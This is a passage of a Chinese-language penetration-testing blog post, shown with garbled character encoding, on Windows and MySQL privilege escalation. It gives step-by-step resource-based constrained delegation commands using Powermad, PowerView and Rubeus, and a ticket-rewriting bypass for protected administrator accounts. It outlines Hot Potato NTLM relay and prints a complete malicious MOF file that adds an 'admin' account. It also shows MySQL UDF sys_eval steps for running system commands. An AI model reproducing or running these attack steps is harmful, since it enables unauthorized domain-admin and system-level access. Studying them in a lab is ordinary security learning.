<h4 id="åŸç†çš„å‡ ä¸ªç‚¹ï¼š"><a href="#åŸç†çš„å‡ ä¸ªç‚¹ï¼š" class="headerlink" title="åŸç†çš„å‡ ä¸ªç‚¹ï¼š"></a>åŸç†çš„å‡ ä¸ªç‚¹ï¼š</h4><p>1.S4U2SELF åè®®å¯ä»¥åœ¨ç”¨æˆ·æ²¡æœ‰é…ç½® TrustedToAuthenticationForDelegation å±æ€§ï¼ˆå³å¼€å¯ä½¿ç”¨ä»»ä½•åè®®è®¤è¯çš„çº¦æŸæ€§å§”æ´¾ï¼‰æ—¶è¢«è°ƒç”¨ï¼Œä½†æ˜¯è¿”å›çš„STæ˜¯ä¸å¯è¢«è½¬å‘çš„ã€‚<br>2.åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾ä¸»æœº åœ¨è¢«å¦ä¸€å°ä¸»æœºå§”æ´¾è®¿é—®æ—¶ï¼Œåœ¨S4U2PROXYè¿‡ç¨‹ä¸­æäº¤è¿‡æ¥çš„STå¦‚æœå³ä½¿æ˜¯ä¸å¯è½¬å‘çš„ã€‚KDCä¾æ—§ä¼šè¿”å›æœ‰æ•ˆçš„ST2ã€‚<br>3.æ¯ä¸ªæ™®é€šåŸŸç”¨æˆ·é»˜è®¤å¯ä»¥åˆ›å»ºè‡³å¤šåä¸ªæœºå™¨è´¦æˆ·ï¼ˆ ç”±MachineAccountQuotaå±æ€§å†³å®š ï¼‰ï¼Œæ¯ä¸ªæœºå™¨è´¦æˆ·è¢«åˆ›å»ºæ—¶éƒ½ä¼šè‡ªåŠ¨æ³¨å†ŒSPN: <code>RestrictedKrbHost/domain</code>å’Œ<code>HOST/domain</code>è¿™ä¸¤ä¸ªSPN</p>
<h4 id="æ”»å‡»æµç¨‹"><a href="#æ”»å‡»æµç¨‹" class="headerlink" title="æ”»å‡»æµç¨‹:"></a>æ”»å‡»æµç¨‹:</h4><p>å‡è®¾å¼€å¯åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾æœºå™¨ä¸ºA<br>1.é¦–å…ˆè¦æœ‰ä¸€ä¸ªå¯¹å½“å‰è®¡ç®—æœºæœ‰å†™æƒé™çš„è´¦æˆ·ï¼Œæ‰èƒ½å¯¹Aè®¾ç½®å¯ä»¥ è¢« å§”æ´¾è®¿é—®çš„æœåŠ¡è´¦æˆ·ã€‚<br>2.åˆ©ç”¨å½“å‰è´¦æˆ·åˆ›å»ºä¸€ä¸ªæœºå™¨è´¦æˆ·ï¼Œå¹¶é…ç½®å¥½æœºå™¨è´¦æˆ·åˆ°Açš„ åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾<br>3.å› ä¸ºæœºå™¨è´¦æˆ·æ˜¯æˆ‘ä»¬åˆ›å»ºçš„ï¼Œæˆ‘ä»¬çŸ¥é“ä»–çš„å¯†ç è´¦æˆ·ï¼Œå¯ä»¥è®©å®ƒåˆ©ç”¨S4U2SELFåè®®è·å¾—ä¸€ä¸ªä¸å¯è½¬å‘STã€‚ç„¶åç”¨è¿™ä¸ªä¸å¯è½¬å‘STé€šè¿‡S4U2PROXYï¼Œåœ¨åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾åŸºç¡€ä¸Šè·å¾—æœ‰æ•ˆçš„è®¿é—®A cifsæœåŠ¡çš„ST2ã€‚<br>4.ç”¨ST2è®¿é—®Açš„CIFSæœåŠ¡ï¼Œæƒé™è·å¾—ã€‚</p>
<h4 id="å®æ“"><a href="#å®æ“" class="headerlink" title="å®æ“"></a>å®æ“</h4><p>è¿™ä¸ªæ”»å‡»è¯´ç™½äº†å°±æ˜¯ä¸ªææƒâ€¦</p>
<p>é¦–å…ˆæˆ‘ä»¬æ£€æŸ¥ä¸€ä¸‹åŸŸæ§æ˜¯å¦æ˜¯win2012ä»¥ä¸Šçš„ä¸»æœºï¼Œå› ä¸ºåªæœ‰è¿™æ ·æ‰èƒ½å¼€å¯ åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾ã€‚</p>
<p>æˆ‘ä»¬ä½¿ç”¨powersploitä¸‹çš„powerviewè„šæœ¬ã€‚æ‰§è¡Œå‘½ä»¤ get-netdomaincontroller</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135833.png" alt="QQæˆªå›¾20210217135833"></p>
<p>å¯ä»¥è·å¾—åŸŸæ§WINç‰ˆæœ¬</p>
<p>ç„¶åæˆ‘ä»¬æŸ¥çœ‹å½“å‰ç”¨æˆ·å¯¹å“ªå°ä¸»æœºæœ‰å†™æƒé™ã€‚å› ä¸ºæ˜¯å®éªŒï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆæ¥çœ‹çœ‹æ€ä¹ˆé…ç½®ä¸€ä¸ªç”¨æˆ·å¯¹ä¸€ä¸ªæœºå™¨çš„æƒé™ã€‚<br>ç›´æ¥åœ¨åŸŸæ§ä¸Šæ‰¾åˆ°æŸä¸»æœºï¼Œç„¶åè¿›å…¥åœ¨å±æ€§é‡Œè¿›å…¥å®‰å…¨é€‰é¡¹å¡ï¼Œæ·»åŠ æŸç”¨æˆ·ï¼Œç„¶åç»™è¿™ä¸ªç”¨æˆ·åˆ†é…æƒé™å³å¯ã€‚</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135859.png" alt="QQæˆªå›¾20210217135859"></p>
<p>æˆ‘ä»¬ä¾æ—§ä½¿ç”¨powerviewã€‚å…ˆè°ƒç”¨<br><code>Get-DomainUser -Identity username -Properties objectsid</code>æ¥è·å–å½“å‰ç”¨æˆ·SID<br>ç„¶å<code>Get-DomainObjectAcl -Identity ä¸»æœºå | ?&#123;$_.SecurityIdentifier -match &quot;åˆšåˆšå¾—åˆ°çš„SID&quot;&#125;</code> æŸ¥çœ‹å½“å‰ç”¨æˆ·å¯¹æŸå°ä¸»æœºæ˜¯å¦æœ‰å†™æƒé™ã€‚</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217140628.png" alt="QQæˆªå›¾20210217140628"></p>
<p>å¦‚æœæœ‰ GenericAllï¼ˆå®Œå…¨æ§åˆ¶æƒï¼‰ï¼ŒGenericWriteã€WritePropertyã€WriteDacl è¿™äº›å±æ€§ï¼Œå°±è¯´æ˜è¯¥ç”¨æˆ·èƒ½ä¿®æ”¹è®¡ç®—æœºçš„è´¦æˆ·å±æ€§ã€‚<br>å¦‚å›¾çœ‹åˆ°æˆ‘ä»¬å¯¹WIN7è¿›è¡Œæ“ä½œ</p>
<p>å¥½çš„ï¼Œæˆ‘ä»¬æ¥ä¸‹æ¥å°±è¦åˆ›ç«‹ä¸€ä¸ªæœºå™¨ç”¨æˆ·äº†ã€‚æ ¹æ®ç½‘ä¸Šæœç´¢ç»“æœï¼Œä½¿ç”¨powermadè¿™ä¸ªpsè„šæœ¬å¯ä»¥å¾ˆå¿«æ·çš„åˆ›å»ºä¸€ä¸ªæœºå™¨ç”¨æˆ·ã€‚<a target="_blank" rel="noopener" href="https://github.com/Kevin-Robertson/Powermad">https://github.com/Kevin-Robertson/Powermad</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Import-Module .\Powermad.ps1New-MachineAccount -MachineAccount hacksystem -Password $(ConvertTo-SecureString &quot;hack&quot; -AsPlainText -Force)</span><br></pre></td></tr></table></figure>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217140659.png" alt="QQæˆªå›¾20210217140659"></p>
<p>å¥½çš„ï¼Œæˆ‘ä»¬æ·»åŠ äº†ä¸€ä¸ªå¯†ç hackï¼Œåä¸ºhacksystemçš„æœºå™¨è´¦æˆ·ï¼Œæ¥ä¸‹æ¥å°±æ˜¯é…ç½®hacksystemåˆ°WIN7çš„å§”æ´¾äº†ã€‚æˆ‘ä»¬éœ€è¦åšçš„ï¼Œæ˜¯ä¿®æ”¹WIN7çš„ <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>å±æ€§çš„å€¼ ï¼Œè¿™ä¸ªæ“ä½œæˆ‘ä»¬ç”¨powerviewå®ç°ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$SD &#x3D; New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3298638106-3321833000-1571791979-1112)&quot;  </span><br><span class="line">#è¿™å„¿çš„sidæ˜¯æˆ‘ä»¬åˆ›å»ºçš„#æœºå™¨ç”¨æˆ·#evilsystemçš„sid</span><br><span class="line">$SDBytes &#x3D; New-Object byte[] ($SD.BinaryLength)</span><br><span class="line">$SD.GetBinaryForm($SDBytes, 0)</span><br><span class="line">Get-DomainComputer WIN7| Set-DomainObject -Set @&#123;&#39;msds-allowedtoactonbehalfofotheridentity&#39;&#x3D;$SDBytes&#125; -Verbose</span><br></pre></td></tr></table></figure>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217140726.png" alt="QQæˆªå›¾20210217140726"></p>
<p>è‡³äºæœºå™¨è´¦æˆ·SIDæ€ä¹ˆè·å¾—ï¼Œpowerviewä¸‹çš„ <code>get-domiancomputer hacksystem</code><br>ç„¶åä½¿ç”¨<code>Get-DomainComputer WIN7 -Properties msds-allowedtoactonbehalfofotheridentity</code> æŸ¥çœ‹å§”æ´¾æ˜¯å¦è®¾ç½®æˆåŠŸ</p>
<p><code>Set-DomainObject win7 -Clear &#39;msds-allowedtoactonbehalfofotheridentity&#39; -Verbose </code>æ­¤å‘½ä»¤å¯ä»¥æ¸…é™¤ msds-allowedtoactonbehalfofotheridentityå±æ€§çš„å€¼</p>
<p>ç°åœ¨éƒ½ç»Ÿç»Ÿè®¾ç½®å¥½äº†ï¼Œå¼€å§‹ä¸‹ä¸€æ­¥å§ã€‚<br>ç½‘ä¸Šä¸€èˆ¬ç”¨çš„rubeusï¼Œè¿™é‡Œæˆ‘ç”¨kekeoå§</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Rubeus.exe hash &#x2F;user:xxx &#x2F;password:xxx &#x2F;domain:xxx</span><br></pre></td></tr></table></figure>
<p>æœ¬åœ°è¿ç®—å‡ºæœºå™¨ç”¨æˆ·ntlm hash è¿™é‡Œå€Ÿç”¨ä¸€ä¸‹åˆ«äººçš„å›¾</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217140944.png" alt="QQæˆªå›¾20210217140944"></p>
<p><code>Rubeus.exe s4u /user:evilsystem$ /rc4:B1739F7FC8377E25C77CFA2DFBDC3EC7 /impersonateuser:administrator /msdsspn:cifs/dm2008 /ptt</code> å†™å…¥ç¥¨æ®</p>
<p>ç„¶åæˆ‘åœ¨æœ¬æœºä½¿ç”¨ä»¥ä¸Šæ–¹æ³•åklistä¸€ä¸‹ï¼Œå‘ç°ç¡®å®å­˜åœ¨ç¥¨æ®</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217140737.png" alt="QQæˆªå›¾20210217140737"></p>
<p>ä½†æ˜¯dir \test1\c$æ—¶æœ¬æœºè«åå…¶å¦™ä¸èƒ½è¿›è¡ŒkerberoséªŒè¯ï¼Œæˆ‘æœäº†ã€‹ã€‚ã€‚ä½†ä¸ç®¡æ€æ ·ï¼Œæˆ‘ä»¬æ‹¿åˆ°é“¶ç¥¨äº†</p>
<h4 id="æ•æ„Ÿç”¨æˆ·ä¸å¯å§”æ´¾çš„ç»•è¿‡"><a href="#æ•æ„Ÿç”¨æˆ·ä¸å¯å§”æ´¾çš„ç»•è¿‡" class="headerlink" title="æ•æ„Ÿç”¨æˆ·ä¸å¯å§”æ´¾çš„ç»•è¿‡"></a>æ•æ„Ÿç”¨æˆ·ä¸å¯å§”æ´¾çš„ç»•è¿‡</h4><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217141050.png" alt="QQæˆªå›¾20210217141050"></p>
<p>è‹¥æˆ‘ä»¬çš„administratorç”¨æˆ·è¢«è®¾ç½®ä¸ºæ•æ„Ÿç”¨æˆ·ä¸å¯å§”æ´¾æˆ–è€…è¢«åŠ å…¥ä¿æŠ¤ç»„ï¼ŒæŒ‰ç†è¯´ä»–çš„è®¿é—®å°±ä¸èƒ½è¿›è¡Œå§”æ´¾ã€‚</p>
<p>æˆ‘ä»¬åœ¨ä»¥administratorè´¦æˆ·èº«ä»½è¿›è¡ŒS4Uæ—¶ï¼Œåªèƒ½è¿›è¡ŒS4U2SELFï¼Œä¸èƒ½è¿›è¡ŒS4U2PROXYã€‚æˆ‘ä»¬ç”¨ <code>Rubeus.exe s4u /user:evilsystem$ /rc4:B1739F7FC8377E25C77CFA2DFBDC3EC7 /impersonateuser:administrator /msdsspn:cifs/dm2008 /ptt</code>ç»§ç»­å®éªŒadministratorï¼Œå‘ç°ç¡®å®æ˜¯è¿™æ ·</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217141131.png" alt="QQæˆªå›¾20210217141131"></p>
<p>æ­¤æ—¶æˆ‘ä»¬ç”¨ rubeus.exe describe /ticker:S4Ubase64åŠ å¯†çš„ç¥¨æ®</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217141313.png" alt="QQæˆªå›¾20210217141313"></p>
<p>å¯ä»¥å‘ç°servicenameå¹¶æ²¡æœ‰æŒ‡å®šæŸä¸ªæœåŠ¡ï¼Œä»…ä»…åªæœ‰ä¸€ä¸ªè´¦æˆ·.å³å‘ç”Ÿäº†æœåŠ¡åç§°ç¼ºå¤±çš„é—®é¢˜ã€‚å¾ˆç®€å•ï¼ŒæŠŠç¥¨æ®ä¿®æ”¹ä¸€ä¸‹å°±è¡Œäº†.ç½‘ä¸Šå¾ˆå¤šè¯´ç”¨è¿™ä¸ªå·¥å…·<br><a target="_blank" rel="noopener" href="https://www.pkisolutions.com/tools/asn1editor/">https://www.pkisolutions.com/tools/asn1editor/</a><br>ä½†å®é™…ä¸Šrubeusä¹Ÿèƒ½å®Œæˆç¥¨æ®ä¿®æ”¹<code>rubeus.exe tgssub /ticket:xxx /altservice:cifs/test1 /ptt</code></p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217141325.png" alt="QQæˆªå›¾20210217141325"></p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217141339.png" alt="QQæˆªå›¾20210217141339"></p>
<p>å®Œäº‹</p>
<h2 id="POTATO-å®¶æ—"><a href="#POTATO-å®¶æ—" class="headerlink" title="POTATO å®¶æ—"></a>POTATO å®¶æ—</h2><h3 id="hot-potato"><a href="#hot-potato" class="headerlink" title="hot potato"></a>hot potato</h3><p>çƒ­åœŸè±†ææƒã€‚å¾ˆæ—©å‰å°±å¬è¯´è¿‡äº†ï¼Œä½†ä¸€ç›´æ²¡å»äº†è§£è¿‡ã€‚å‰ç½®çŸ¥è¯†æ˜¯ntlm relay,å¯ä»¥å»äº†è§£äº†è§£ã€‚ potatoå®¶æ—æœ‰å¾ˆå¤šï¼Œhot potatoåªæ˜¯å…¶ä¸­ä¸€ç§ææƒæ–¹å¼ã€‚<br>æˆ‘ç¯å¢ƒæœ‰é—®é¢˜ï¼Œä¸èƒ½å¾ˆå¥½çš„å¤ç°ğŸ™ƒï¼ŒæŠ“åŒ…åˆ†æå•¥çš„å…ˆå’•å’•å§ã€‚</p>
<p><a target="_blank" rel="noopener" href="https://github.com/foxglovesec/Potato%F0%9F%91%88%E5%B7%A5%E5%85%B7">https://github.com/foxglovesec/PotatoğŸ‘ˆå·¥å…·</a><br><a target="_blank" rel="noopener" href="https://foxglovesecurity.com/2016/01/16/hot-potato/">https://foxglovesecurity.com/2016/01/16/hot-potato/</a> ğŸ‘ˆHOT POTATOæŠ€æœ¯æ–‡æ¡£ï¼Œå›½å†…åŸºæœ¬ä¸Šç¿»è¯‘è¿™ä¸ªæ¥çš„ã€‚</p>
<p>ææƒæ­¥éª¤å¤§æ¦‚æ˜¯è¿™ä¸ªæµç¨‹<br>1.æœ¬åœ°nbnsæœåŠ¡æ¬ºéª—<br>2.wpadåŠ«æŒ<br>3.HTTP-&gt;SMB çš„ ntlm relay</p>
<p>1.æœ¬åœ°nbnsæœåŠ¡æ¬ºéª—</p>
<p>WindowsåŸŸåè§£æè§„åˆ™æ˜¯<br>æœ¬åœ°HOSTæ–‡ä»¶-ã€‹dnsæŸ¥è¯¢-ã€‹NBNSæˆ–è€…LLMNRæŸ¥è¯¢<br>ä¸€æ—¦æœ¬åœ°å‘å‡ºNBNSæŸ¥è¯¢ï¼Œæˆ‘ä»¬æœ¬åœ°å°±å¯ä»¥è¿…é€Ÿå“åº”ï¼Œå•ªçš„ä¸€ä¸‹å°±å“åº”äº†ï¼Œå¾ˆå¿«å•Šï¼Œæœ¬åœ°å‘åŒ…å¾ˆå¿«ï¼Œåªè¦å‘å‡ºNBNSåŒ…åŸºæœ¬ä¸Šéƒ½èƒ½è¢«æˆ‘ä»¬æœ¬åœ°å‘åŒ…å“åº”ã€‚<br>ä½†æ˜¯ä»¥ä¸Šæ­¥éª¤è¿˜æ˜¯æœ‰ä¸€äº›ç»†èŠ‚çš„ï¼šæˆ‘ä»¬å½“å‰å¹¶éç®¡ç†å‘˜æƒé™ï¼Œå¤§å‡ ç‡æ˜¯æ— æ³•å—…æ¢æœ¬åœ°æµé‡çš„,å¦‚æœæˆ‘ä»¬èƒ½å¤Ÿäº‹å…ˆçŸ¥é“ç›®æ ‡ä¸»æœºæœŸæœ›NBNSæŸ¥è¯¢è·å¾—çš„ä¸»æœºåï¼Œæˆ‘ä»¬å¯ä»¥ä¼ªé€ ä¸€ä¸ªå“åº”ï¼Œå¯¹å‘é€NBNSæŸ¥è¯¢çš„é‚£ä¸ªä¸»æœºå¿«é€Ÿçš„å¤§é‡å‘é€NBNSå“åº” .ä½†æ˜¯nbnsæµé‡åŒ…è¿˜æœ‰ä¸ªå«ç‰¹å¾ç çš„ä¸œè¥¿ï¼Œè¯·æ±‚åŒ…å’Œå“åº”åŒ…çš„ç‰¹å¾ç å¿…é¡»ç›¸åŒï¼Œæ‰€ä»¥æˆ‘ä»¬è¢«è¿«å‘é€65536ä¸ªåŒ…çˆ†ç ´è¿™ä¸ªç‰¹å¾ç â€”â€”æœ¬åœ°å‘åŒ…é€Ÿåº¦å¾ˆå¿«ï¼Œæœ¬åœ°NBNSæ¬ºéª—æˆåŠŸç‡åŸºæœ¬ä¸Šåœ¨100%ã€‚</p>
<p>2.WPADåŠ«æŒ</p>
<p>NBNSæ¬ºéª—åæˆ‘ä»¬å°±å¯ä»¥åŠ«æŒWPADçš„åŸŸåï¼ŒæŠŠè‡ªå·±ä¼ªé€ ç§°WPADå¹¶è¿”å›è‡ªå®šä¹‰çš„PACæ–‡ä»¶ã€‚æ„å‘³ç€æˆ‘ä»¬å¯ä»¥æŠŠæœ¬åœ°å‘å‡ºçš„æ‰€æœ‰æµé‡é‡å®šå‘ã€‚</p>
<p>3.RELAY</p>
<p>åœ¨ç°åœ¨è¿™ä¸ªå¹´ä»£ï¼ŒSMB-&gt;SMBçš„relayå¾ˆå°‘ç”¨åˆ°äº†ï¼Œå¾®è½¯ ç¦ç”¨äº†åŒåè®®çš„NTLMè®¤è¯ ï¼ŒæˆåŠŸç‡å¾ˆä½ã€‚<br>ä½†æ˜¯HTTP-&gt;SMBçš„relayè¿˜æ˜¯æœ‰çš„ã€‚HOT POTATOå°±æ˜¯åˆ©ç”¨çš„è¿™ä¸€ç‚¹ã€‚<br>æˆ‘ä»¬å¯ä»¥æŠŠä¸»æœºå‘å‡ºçš„HTTPè¯·æ±‚é‡å®šå‘åˆ°æˆ‘ä»¬è‡ªå®šä¹‰çš„ç½‘é¡µAï¼Œè€Œç½‘é¡µAéœ€è¦NTLMè®¤è¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥è¿›è¡ŒHTTP-&gt;SMBçš„relayâ€™äº†ã€‚å½“HTTPè¯·æ±‚æ¥è‡ªäºé«˜æƒé™çš„è´¦æˆ·æ—¶ï¼Œä¾‹å¦‚æ˜¯æ¥è‡ªwindows æ›´æ–°æœåŠ¡çš„è¯·æ±‚ï¼Œå‘½ä»¤å°±ä¼šä»¥â€NT AUTHORITY\SYSTEMâ€æƒé™è¿è¡Œã€‚</p>
<p>HOT POTATO æ ¹æ®Windowsç‰ˆæœ¬çš„ä¸åŒï¼Œéœ€è¦ç­‰å¾…é«˜æƒé™ç”¨æˆ·NTLMè®¤è¯æ¥åˆ°çš„æ—¶é—´ä¹Ÿä¸åŒã€‚ä¸€èˆ¬æ¥è¯´ï¼Œ<br>WIN7æ˜¯ç¬é—´å°±å¯ä»¥ææƒçš„<br>Windows Server 2012 R2,Windows Server 2012,Windows 8.1,Windows 8æœ‰ä¸€ä¸ªè‡ªåŠ¨æ›´æ–°æœºåˆ¶ï¼Œä¼šæ¯å¤©ä¸‹è½½è¯ä¹¦ä¿¡ä»»åˆ—è¡¨(CTLs)<br>,etc</p>
<h2 id="MYSQLä¸‹çš„ææƒæŠ€æœ¯"><a href="#MYSQLä¸‹çš„ææƒæŠ€æœ¯" class="headerlink" title="MYSQLä¸‹çš„ææƒæŠ€æœ¯"></a>MYSQLä¸‹çš„ææƒæŠ€æœ¯</h2><h3 id="MOFææƒ"><a href="#MOFææƒ" class="headerlink" title="MOFææƒ"></a>MOFææƒ</h3><p>åœ¨c:/windows/system32/wbem/mof/ç›®å½•ä¸‹çš„nullevt.mofæ¯åˆ†é’Ÿéƒ½ä¼šæœ‰ä¸€ä¸ªç‰¹å®šçš„æ—¶é—´å»æ‰§è¡Œä¸€æ¬¡ï¼ˆç”±â€And TargetInstance.Second = 5â€³;æ§åˆ¶ï¼Œè¿™é‡Œè¾“å…¥5å°±æ˜¯æ¯åˆ†é’Ÿçš„ç¬¬äº”ç§’æ‰§è¡Œã€‚ é‚£ä¹ˆæŠŠcmdå‘½ä»¤æ·»åŠ åˆ°nullevt.mofä¸­ï¼Œcmdå‘½ä»¤å°±ä¼šè‡ªåŠ¨æ‰§è¡Œäº†ã€‚</p>
<p>å‰ææ˜¯æˆ‘ä»¬è¦èƒ½è¿›å…¥æ•°æ®åº“è¿›è¡Œæ“ä½œï¼Œä¸”mysqlæ•°æ®åº“çš„æƒé™å°½å¯èƒ½é«˜æ‰æ›´æœ‰åˆ©ã€‚åŒæ—¶secure-file-priv è¦ä¸ºç©ºï¼ˆ mysql 5.6.34ç‰ˆæœ¬ä»¥å secure_file_privçš„å€¼é»˜è®¤ä¸ºNULL,ç¦æ­¢æ‰€æœ‰æ–‡ä»¶å¯¼å…¥å¯¼å‡ºåŠŸèƒ½ï¼‰</p>
<p>æˆ‘ä»¬ä¼ªé€ çš„MOFæ–‡ä»¶æ ¼å¼å¦‚ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;) </span><br><span class="line"></span><br><span class="line">instance of __EventFilter as $EventFilter </span><br><span class="line">&#123; </span><br><span class="line">    EventNamespace &#x3D; &quot;Root\\Cimv2&quot;; </span><br><span class="line">    Name  &#x3D; &quot;filtP2&quot;; </span><br><span class="line">    Query &#x3D; &quot;Select * From __InstanceModificationEvent &quot; </span><br><span class="line">            &quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot; </span><br><span class="line">            &quot;And TargetInstance.Second &#x3D; 5&quot;; </span><br><span class="line">    QueryLanguage &#x3D; &quot;WQL&quot;; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer </span><br><span class="line">&#123; </span><br><span class="line">    Name &#x3D; &quot;consPCSV2&quot;; </span><br><span class="line">    ScriptingEngine &#x3D; &quot;JScript&quot;; </span><br><span class="line">    ScriptText &#x3D; </span><br><span class="line">    &quot;var WSH &#x3D; new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user admin admin &#x2F;add\&quot;)&quot;;   &#x2F;&#x2F;ä¿®æ”¹æ­¤å¤„å³å¯</span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of __FilterToConsumerBinding </span><br><span class="line">&#123; </span><br><span class="line">    Consumer   &#x3D; $Consumer; </span><br><span class="line">    Filter &#x3D; $EventFilter; </span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure>
<p>ä¿®æ”¹ä¸Šé¢çš„cmdéƒ¨åˆ†å³å¯å®ç°ä»¥ç®¡ç†å‘˜èº«ä»½æ‰§è¡Œå„ç§å‘½ä»¤ã€‚<br>ç„¶åæˆ‘ä»¬ä½¿ç”¨mysqlä¸‹çš„å‘½ä»¤ ï¼Œå°†mofè¦†ç›–è¿‡å»ã€‚<br>å¾…æˆ‘ä»¬çš„å‘½ä»¤è¢«æ‰§è¡Œåï¼Œå³ä»£è¡¨ææƒæˆåŠŸã€‚<br>Windows 2003ä¼¼ä¹æˆåŠŸç‡è›®é«˜çš„ï¼ŒWIN7è¯•äº†è¯•æ²¡ååº”ã€‚ã€‚ã€‚</p>
<h3 id="UDFææƒ"><a href="#UDFææƒ" class="headerlink" title="UDFææƒ"></a>UDFææƒ</h3><p>ï¼ˆè¿™ä¸ªä¹Ÿå¯ä»¥linuxææƒ</p>
<p>udfï¼Œå³è‡ªå®šä¹‰å‡½æ•°ï¼ˆuser define functionï¼‰</p>
<p>MYSQLå¯ä»¥è‡ªå®šä¹‰å‡½æ•°çš„ã€‚è‡ªå®šä¹‰å‡½æ•°åœ¨Windowsä¸‹æ˜¯ä»¥DLLæ–‡ä»¶å­˜åœ¨äºMYSQLçš„æ’ä»¶æ–‡ä»¶å¤¹é‡Œé¢çš„ï¼ˆlinuxåˆ™æ˜¯ä»¥osçš„å½¢å¼ï¼‰ã€‚æˆ‘ä»¬å¯ä»¥è‡ªå®šä¹‰ä¸€ä¸ªæ¶æ„dllï¼Œé‡Œé¢å­˜æ”¾ç€å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„ å‡½æ•°ã€‚ç„¶åäº¤ç»™mysqlä»¥æ•°æ®åº“æƒé™æ‰§è¡Œã€‚</p>
<p>å‰æï¼šæˆ‘ä»¬èƒ½æ“ä½œæ•°æ®åº“ï¼Œä¸”æ•°æ®åº“æƒé™å¿…é¡»å¾ˆé«˜ï¼ˆæˆ‘ä»¬ç”¨è¿™ä¸ªæ–¹æ³•ææƒåˆ°çš„æƒé™å°±æ˜¯æ•°æ®åº“çš„æƒé™</p>
<p>é‚£ä¹ˆè¿™ä¸ªdllæ–‡ä»¶å“ªé‡Œæ¥å‘¢ã€‚sqlmapå’Œmsféƒ½æœ‰ã€‚sqlmapä¸‹çš„ sqlmap/data/udf/mysql/windows/64/lib_mysqludf_sys.dll_ å°±æ˜¯è¿™ä¸ªdllæ–‡ä»¶çš„ç¼–ç ç‰ˆæœ¬ã€‚æˆ‘ä»¬ä½¿ç”¨sqlmapä¸‹çš„sqlmap/extra/cloak/cloak.pyå¯¹å…¶è¿›è¡Œè§£ç è·å¾—dllæ–‡ä»¶ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python .&#x2F;cloak.py -d -i .&#x2F;lib_mysqludf_sys.dll_  å³å¯è·å¾—dllæ–‡ä»¶</span><br></pre></td></tr></table></figure>
<p>ç„¶åæˆ‘ä»¬æŠŠdllæ–‡ä»¶æ”¾å…¥mysqlçš„æ’ä»¶æ–‡ä»¶å¤¹ï¼Œå‘½åä¸ºudf.dllã€‚æ’ä»¶æ–‡ä»¶å¤¹å¯ä»¥é€šè¿‡å‘½ä»¤</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show variables like &quot;%plugin%&quot;;è·å¾—  ï¼ˆ&#x2F;lib&#x2F;pluginæ–‡ä»¶å¤¹éœ€è¦è‡ªå·±åˆ›å»ºï¼‰</span><br></pre></td></tr></table></figure>
<p>è‡³äºæ€ä¹ˆæŠŠdllæ”¾å…¥æ’ä»¶æ–‡ä»¶å¤¹</p>
<p>1.ç›´æ¥ç²˜è´´å¤åˆ¶ ï¼ˆæƒé™å¯èƒ½ä¸å¤Ÿ<br>2.ä½¿ç”¨å‘½ä»¤ select load_file(â€˜udf.dllâ€™) into dumpfile â€œPLUGINçš„è·¯å¾„â€;(éœ€è¦secure_file_privä¸ºç©º</p>
<p>æ€»ä¹‹ï¼Œå¦‚æœæŠŠudf.dllæ”¾å…¥pluginæ–‡ä»¶å¤¹åï¼Œæˆ‘ä»¬å°±å¯ä»¥æ‰§è¡Œä»¥ä¸‹æ“ä½œææƒäº†ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create funtion sys_eval returns string soname &quot;udf.dll&quot;;</span><br><span class="line">select sys_eval(&#39;cmd&#39;);</span><br></pre></td></tr></table></figure>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217144509.png" alt="QQæˆªå›¾20210217144509"></p>
